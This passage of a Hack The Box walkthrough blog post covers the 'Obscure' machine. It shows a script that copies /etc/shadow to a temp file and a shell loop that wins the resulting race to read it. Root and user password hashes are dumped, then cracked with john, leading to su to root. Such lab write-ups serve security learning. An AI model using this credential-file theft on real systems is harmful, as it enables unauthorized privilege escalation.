<span class="code-line"></code></pre></div>

<p>We get the betterSSH.py file.</p>
<div class="highlight"><pre><span class="code-line"><span></span><code><span class="kn">import</span> <span class="nn">sys</span></span>
<span class="code-line"><span class="kn">import</span> <span class="nn">random</span><span class="o">,</span> <span class="nn">string</span></span>
<span class="code-line"><span class="kn">import</span> <span class="nn">os</span></span>
<span class="code-line"><span class="kn">import</span> <span class="nn">time</span></span>
<span class="code-line"><span class="kn">import</span> <span class="nn">crypt</span></span>
<span class="code-line"><span class="kn">import</span> <span class="nn">traceback</span></span>
<span class="code-line"><span class="kn">import</span> <span class="nn">subprocess</span></span>
<span class="code-line"></span>
<span class="code-line"><span class="n">path</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">random</span><span class="o">.</span><span class="n">choices</span><span class="p">(</span><span class="n">string</span><span class="o">.</span><span class="n">ascii_letters</span> <span class="o">+</span> <span class="n">string</span><span class="o">.</span><span class="n">digits</span><span class="p">,</span> <span class="n">k</span><span class="o">=</span><span class="mi">8</span><span class="p">))</span></span>
<span class="code-line"><span class="n">session</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&quot;user&quot;</span><span class="p">:</span> <span class="s2">&quot;&quot;</span><span class="p">,</span> <span class="s2">&quot;authenticated&quot;</span><span class="p">:</span> <span class="mi">0</span><span class="p">}</span></span>
<span class="code-line"><span class="k">try</span><span class="p">:</span></span>
<span class="code-line">    <span class="n">session</span><span class="p">[</span><span class="s1">&#39;user&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s2">&quot;Enter username: &quot;</span><span class="p">)</span></span>
<span class="code-line">    <span class="n">passW</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s2">&quot;Enter password: &quot;</span><span class="p">)</span></span>
<span class="code-line"></span>
<span class="code-line">    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;/etc/shadow&#39;</span><span class="p">,</span> <span class="s1">&#39;r&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span></span>
<span class="code-line">        <span class="n">data</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">readlines</span><span class="p">()</span></span>
<span class="code-line">    <span class="n">data</span> <span class="o">=</span> <span class="p">[(</span><span class="n">p</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&quot;:&quot;</span><span class="p">)</span> <span class="k">if</span> <span class="s2">&quot;$&quot;</span> <span class="ow">in</span> <span class="n">p</span> <span class="k">else</span> <span class="kc">None</span><span class="p">)</span> <span class="k">for</span> <span class="n">p</span> <span class="ow">in</span> <span class="n">data</span><span class="p">]</span></span>
<span class="code-line">    <span class="n">passwords</span> <span class="o">=</span> <span class="p">[]</span></span>
<span class="code-line">    <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">data</span><span class="p">:</span></span>
<span class="code-line">        <span class="k">if</span> <span class="ow">not</span> <span class="n">x</span> <span class="o">==</span> <span class="kc">None</span><span class="p">:</span></span>
<span class="code-line">            <span class="n">passwords</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">x</span><span class="p">)</span></span>
<span class="code-line"></span>
<span class="code-line">    <span class="n">passwordFile</span> <span class="o">=</span> <span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">([</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">p</span><span class="p">)</span> <span class="k">for</span> <span class="n">p</span> <span class="ow">in</span> <span class="n">passwords</span><span class="p">])</span></span>
<span class="code-line">    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;/tmp/SSH/&#39;</span><span class="o">+</span><span class="n">path</span><span class="p">,</span> <span class="s1">&#39;w&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span></span>
<span class="code-line">        <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">passwordFile</span><span class="p">)</span></span>
<span class="code-line">    <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">.1</span><span class="p">)</span></span>
<span class="code-line">    <span class="n">salt</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span></span>
<span class="code-line">    <span class="n">realPass</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span></span>
<span class="code-line">    <span class="k">for</span> <span class="n">p</span> <span class="ow">in</span> <span class="n">passwords</span><span class="p">:</span></span>
<span class="code-line">        <span class="k">if</span> <span class="n">p</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="n">session</span><span class="p">[</span><span class="s1">&#39;user&#39;</span><span class="p">]:</span></span>
<span class="code-line">            <span class="n">salt</span><span class="p">,</span> <span class="n">realPass</span> <span class="o">=</span> <span class="n">p</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;$&#39;</span><span class="p">)[</span><span class="mi">2</span><span class="p">:]</span></span>
<span class="code-line">            <span class="k">break</span></span>
<span class="code-line"></span>
<span class="code-line">    <span class="k">if</span> <span class="n">salt</span> <span class="o">==</span> <span class="s2">&quot;&quot;</span><span class="p">:</span></span>
<span class="code-line">        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Invalid user&quot;</span><span class="p">)</span></span>
<span class="code-line">        <span class="n">os</span><span class="o">.</span><span class="n">remove</span><span class="p">(</span><span class="s1">&#39;/tmp/SSH/&#39;</span><span class="o">+</span><span class="n">path</span><span class="p">)</span></span>
<span class="code-line">        <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span></span>
<span class="code-line">    <span class="n">salt</span> <span class="o">=</span> <span class="s1">&#39;$6$&#39;</span><span class="o">+</span><span class="n">salt</span><span class="o">+</span><span class="s1">&#39;$&#39;</span></span>
<span class="code-line">    <span class="n">realPass</span> <span class="o">=</span> <span class="n">salt</span> <span class="o">+</span> <span class="n">realPass</span></span>
<span class="code-line"></span>
<span class="code-line">    <span class="nb">hash</span> <span class="o">=</span> <span class="n">crypt</span><span class="o">.</span><span class="n">crypt</span><span class="p">(</span><span class="n">passW</span><span class="p">,</span> <span class="n">salt</span><span class="p">)</span></span>
<span class="code-line"></span>
<span class="code-line">    <span class="k">if</span> <span class="nb">hash</span> <span class="o">==</span> <span class="n">realPass</span><span class="p">:</span></span>
<span class="code-line">        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Authed!&quot;</span><span class="p">)</span></span>
<span class="code-line">        <span class="n">session</span><span class="p">[</span><span class="s1">&#39;authenticated&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="mi">1</span></span>
<span class="code-line">    <span class="k">else</span><span class="p">:</span></span>
<span class="code-line">        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Incorrect pass&quot;</span><span class="p">)</span></span>
<span class="code-line">        <span class="n">os</span><span class="o">.</span><span class="n">remove</span><span class="p">(</span><span class="s1">&#39;/tmp/SSH/&#39;</span><span class="o">+</span><span class="n">path</span><span class="p">)</span></span>
<span class="code-line">        <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span></span>
<span class="code-line">    <span class="n">os</span><span class="o">.</span><span class="n">remove</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="s1">&#39;/tmp/SSH/&#39;</span><span class="p">,</span><span class="n">path</span><span class="p">))</span></span>
<span class="code-line"><span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span></span>
<span class="code-line">    <span class="n">traceback</span><span class="o">.</span><span class="n">print_exc</span><span class="p">()</span></span>
<span class="code-line">    <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span></span>
<span class="code-line"></span>
<span class="code-line"><span class="k">if</span> <span class="n">session</span><span class="p">[</span><span class="s1">&#39;authenticated&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span></span>
<span class="code-line">    <span class="k">while</span> <span class="kc">True</span><span class="p">:</span></span>
<span class="code-line">        <span class="n">command</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="n">session</span><span class="p">[</span><span class="s1">&#39;user&#39;</span><span class="p">]</span> <span class="o">+</span> <span class="s2">&quot;@Obscure$ &quot;</span><span class="p">)</span></span>
<span class="code-line">        <span class="n">cmd</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;sudo&#39;</span><span class="p">,</span> <span class="s1">&#39;-u&#39;</span><span class="p">,</span>  <span class="n">session</span><span class="p">[</span><span class="s1">&#39;user&#39;</span><span class="p">]]</span></span>
<span class="code-line">        <span class="n">cmd</span><span class="o">.</span><span class="n">extend</span><span class="p">(</span><span class="n">command</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&quot; &quot;</span><span class="p">))</span></span>
<span class="code-line">        <span class="n">proc</span> <span class="o">=</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">Popen</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="n">stdout</span><span class="o">=</span><span class="n">subprocess</span><span class="o">.</span><span class="n">PIPE</span><span class="p">,</span> <span class="n">stderr</span><span class="o">=</span><span class="n">subprocess</span><span class="o">.</span><span class="n">PIPE</span><span class="p">)</span></span>
<span class="code-line"></span>
<span class="code-line">        <span class="n">o</span><span class="p">,</span><span class="n">e</span> <span class="o">=</span> <span class="n">proc</span><span class="o">.</span><span class="n">communicate</span><span class="p">()</span></span>
<span class="code-line">        <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;Output: &#39;</span> <span class="o">+</span> <span class="n">o</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;ascii&#39;</span><span class="p">))</span></span>
<span class="code-line">        <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;Error: &#39;</span>  <span class="o">+</span> <span class="n">e</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;ascii&#39;</span><span class="p">))</span> <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">e</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;ascii&#39;</span><span class="p">))</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="k">else</span> <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="p">)</span></span>
<span class="code-line"></code></pre></div>

<p>We reproduce the step locally. The script is copying the password hashes from
<code>/etc/shadow</code> into a random temporary file in <code>/tmp/SSH/</code> then it does "things"
with the file but we don't care. We just need to get the content of the file at
its creation. We run a infinite loop display the content of every file in the
folder and then exit on a success. At the same time we run the <code>BetterSSH.py</code>
script with the <code>sudo</code> permission. This allow us to get the <code>root</code> password
hash.</p>
<div class="highlight"><pre><span class="code-line"><span></span><code>robert@obscure:~/BetterSSH$ sudo /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py</span>
<span class="code-line">Enter username: root</span>
<span class="code-line">Enter password: lol</span>
<span class="code-line">Incorrect pass</span>
<span class="code-line"></span>
<span class="code-line">robert@obscure:/tmp/SSH$ while true; do cat ./* 2&gt;/dev/null&amp;&amp;exit; done</span>
<span class="code-line">root</span>
<span class="code-line">$6$riekpK4m$uBdaAyK0j9WfMzvcSKYVfyEHGtBfnfpiVbYbzbVmfbneEbo0wSijW1GQussvJSk8X1M56kzgGj8f7DFN1h4dy1</span>
<span class="code-line">18226</span>
<span class="code-line">0</span>
<span class="code-line">99999</span>
<span class="code-line">7</span>
<span class="code-line">robert</span>
<span class="code-line">$6$fZZcDG7g$lfO35GcjUmNs3PSjroqNGZjH35gN4KjhHbQxvWO0XU.TCIHgavst7Lj8wLF/xQ21jYW5nD66aJsvQSP/y1zbH/</span>
<span class="code-line">18163</span>
<span class="code-line">0</span>
<span class="code-line">99999</span>
<span class="code-line">7</span>
<span class="code-line">logout</span>
<span class="code-line">Connection to 10.10.10.168 closed.</span>
<span class="code-line"></code></pre></div>

<p>We load the hash in <code>john</code> with the rockyou dictionary and crack the root password.</p>
<div class="highlight"><pre><span class="code-line"><span></span><code>john hash -w=~/tools/password_lists/rockyou.txt</span>
<span class="code-line">mercedes</span>
<span class="code-line"></code></pre></div>

<p>Then with our SSH account as robert we just <code>su</code> and use the root password to
get the root flag.</p>
<div class="highlight"><pre><span class="code-line"><span></span><code>robert@obscure:~/BetterSSH$ su</span>
<span class="code-line">Password:</span>
<span class="code-line">root@obscure:/home/robert/BetterSSH# cat /root/root.txt</span>
<span class="code-line">512fd4429f33a113a44d5acde23609e3</span>
<span class="code-line"></code></pre></div>

<h1 id="wrapping-up">Wrapping up</h1>
<p>This box is a lot of python. And this is quit straight forward once you get the
<code>SuperSecureServer.py</code> file.</p>
    </div>

      <footer>
          <div>
            <b>Previous article:</b> <a href="../../2020/05/htb-openadmin.html"> HTB: OpenAdmin </a>
          </div>
          <div>
            <b>Next article:</b> <a href="../../2020/05/htb-resolute.html"> HTB: Resolute </a>
          </div>

<div class="social-buttons">


</div>
      </footer>


    <div class="clearfix"></div>

</article>
<!-- /.entry -->
            </div>
        </section>

        <aside class="sidebar pure-u-7-24">
            <div class="l-box">
    <section class="module menuitems">
        <h3 class="title module-title">Menu</h3>

        <ul>
                <li>
                    <span class= "icons icons-archives"></span>
                    <a href="/archives">archives</a>
                </li>
                <li>
                    <span class= "icons icons-feeds"></span>
                    <a href="/feeds/all.atom.xml">feeds</a>
                </li>
                <li>
                    <span class= "icons icons-links"></span>
                    <a href="/pages/links.html">links</a>
                </li>
        </ul>
    </section>

    <section class="module social">
        <h3 class="title module-title">Social</h3>

        <ul>
                <li>
                    <span class= "icons icons-github"></span>
                    <a href="https://github.com/maggick">github</a>
                </li>
                <li>
                    <span class= "icons icons-twitter"></span>
                    <a href="https://twitter.com/maggick_fr">twitter</a>
                </li>
                <li>
                    <span class= "icons icons-stackoverflow"></span>
                    <a href="http://stackoverflow.com/users/1827067/maggick">stackoverflow</a>
                </li>
        </ul>
    </section>


<section class="module tagcloud">
    <h3 class="title module-title">Tags</h3>

    <ul>
            <li class="tag tag-4">
              <a href="../../tag/upload.html">Upload</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/impacket.html">impacket</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/azure.html">Azure</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/screen.html">screen</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/openadmin.html">openAdmin</a>
            </li>
            <li class="tag tag-2">
              <a href="../../tag/programming.html">programming</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/chef.html">chef</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/phs.html">PHS</a>
            </li>
            <li class="tag tag-2">
              <a href="../../tag/challenge.html">challenge</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/msfconsole.html">msfconsole</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/cewl.html">cewl</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/pypi.html">pypi</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/deserialization.html">deserialization</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/crypto.html">Crypto</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/android.html">Android</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/snmp.html">snmp</a>
            </li>
            <li class="tag tag-1">
              <a href="../../tag/boot2root.html">boot2root</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/misc.html">misc</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/webassembly.html">webassembly</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/neofetch.html">neofetch</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/umbraco.html">umbraco</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/cve-2019-5736.html">CVE-2019-5736</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/jackson.html">jackson</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/lfi.html">lfi</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/docker.html">docker</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/drupalgeddon.html">Drupalgeddon</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/composer.html">composer</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/reverse.html">reverse</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/phone-number.html">phone number</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/metasploit.html">metasploit</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/javascript.html">javascript</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/cryptocurrency.html">cryptocurrency</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/nmap.html">nmap</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/smb.html">SMB</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/ldap.html">LDAP</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/ssrf.html">SSRF</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/sudo.html">sudo</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/nft.html">NFT</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/devops.html">devops</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/python.html">python</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/adb.html">adb</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/git.html">git</a>
            </li>
            <li class="tag tag-2">
              <a href="../../tag/windows.html">windows</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/john.html">john</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/vnc.html">VNC</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/memcache.html">memcache</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/osint.html">osint</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/iot.html">IOT</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/blog.html">blog</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/ctf.html">CTF</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/winrm.html">winrm</a>
            </li>
            <li class="tag tag-2">
              <a href="../../tag/vulnhub.html">vulnhub</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/teamviewer.html">teamviewer</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/lxd.html">lxd</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/vb.html">VB</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/msfvenom.html">msfvenom</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/strapi.html">strapi</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/subdomain.html">subdomain</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/zip.html">zip</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/chisel.html">chisel</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/php-filter.html">php filter</a>
            </li>
            <li class="tag tag-1">
              <a href="../../tag/security.html">security</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/vault.html">vault</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/logrotate.html">logrotate</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/scf-file-attack.html">SCF file attack</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/gitlab.html">gitlab</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/bludit.html">bludit</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/xxe.html">XXE</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/xss.html">XSS</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/capabilities.html">capabilities</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/cloudme.html">cloudme</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/imagemagick.html">ImageMagick</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/print-nightmare.html">print nightmare</a>
            </li>
            <li class="tag tag-1">
              <a href="../../tag/linux.html">linux</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/php.html">php</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/laravel.html">laravel</a>
            </li>
            <li class="tag tag-2">
              <a href="../../tag/suid.html">suid</a>
            </li>
            <li class="tag tag-1">
              <a href="../../tag/htb.html">HTB</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/ad-recycle-bin.html">AD Recycle bin</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/splunk.html">Splunk</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/alwaysinstallelevated.html">AlwaysInstallElevated</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/jwt.html">jwt</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/gdbserver.html">gdbserver</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/exiftool.html">exiftool</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/wordpress.html">wordpress</a>
            </li>
            <li class="tag tag-2">
              <a href="../../tag/exploit.html">exploit</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/lxc.html">lxc</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/path.html">PATH</a>
            </li>
            <li class="tag tag-2">
              <a href="../../tag/cve.html">CVE</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/enumeration.html">enumeration</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/openemr.html">openEMR</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/core-dump.html">core dump</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/sqli.html">SQLi</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/ssti.html">SSTI</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/openbsd.html">OpenBSD</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/adminer.html">adminer</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/pandora.html">pandora</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/yaml.html">YAML</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/phishing.html">phishing</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/tomcat.html">tomcat</a>
            </li>
    </ul>
</section>

            </div>
        </aside>
    </div>

    <section class="pure-g-r footer">
<div class="pure-u-2-3 copyright">
    <p class="l-box">
        The content of this blog in under
        <a href="https://creativecommons.org/licenses/by/4.0/"
            title="Share, adapt, use. But mention the author.">Creative Commons Attribution 4.0</a> License.

        The source code is available on <a href="https://github.com/maggick/maggick.github.io/" title="Contribute through GitHub">GitHub</a>.
    </p>
</div>

<div class="pure-u-1-3 credits">
    <p class="l-box">
        Design by <a href="http://www.templateify.com/" title="Maggner Theme">Templateify</a>.
    </p>
</div>    </section>


</div>
</body>
</html>